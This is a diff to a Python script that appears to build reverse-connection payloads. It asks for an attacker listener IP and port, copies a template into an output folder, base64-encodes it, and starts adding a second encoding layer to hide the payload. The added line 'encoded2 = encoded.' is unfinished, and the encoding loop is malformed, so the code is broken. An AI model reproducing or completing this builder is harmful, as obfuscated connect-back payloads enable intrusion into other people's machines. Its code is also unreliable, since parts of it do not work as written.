@@ -5,6 +5,7 @@ import socket
 import base64
 import sys
 import pickle
+import time
 
 GREEN = '\33[32m'
 RED = '\33[31m'
@@ -12,8 +13,6 @@ END = '\33[0m'
 BOLD = '\33[1m'
 
 #print(GREEN + BOLD + "\nThis isn't set up yet! Very soon... Please use the 'client.py' with the github instructions instead.\n" + END)
-print('         ')
-print('         ')
 
 host = input(GREEN + BOLD + 'Set LHOST IP: ' + END)
 port = input(GREEN + BOLD + 'Set LPORT: ' + END)
@@ -22,7 +21,8 @@ name = input(GREEN + BOLD + 'Enter the basename for output files: ' + END)
 def createFile():
     try:
         global copiedFile
-        print(GREEN + BOLD + '\nCreating python file')
+        print(GREEN + BOLD + '\nCreating python file...')
+        time.sleep(1)
         exampleFile = os.getcwd() + '/source/example.py'
         copiedFile = os.getcwd() + '/output/' + name + '.py'
         copyfile(exampleFile, copiedFile)
@@ -44,7 +44,8 @@ def createFile():
         sys.exit()
 
 def encodedFile():
-    print(GREEN + BOLD + 'Encoding file...')
+    print(GREEN + BOLD + 'Encoding file once...')
+    time.sleep(1)
     with open(copiedFile, 'rb') as file:
         for line in file:
             bencoded = base64.b64encode(file.read())
@@ -55,6 +56,9 @@ def encodedFile():
         file.truncate(0)
         file.write(replaceEncoded)
     file.close()
+
+    print(GREEN + BOLD + 'Encoding file twice...')
+    encoded2 = encoded.
 
 def main():
     createFile()
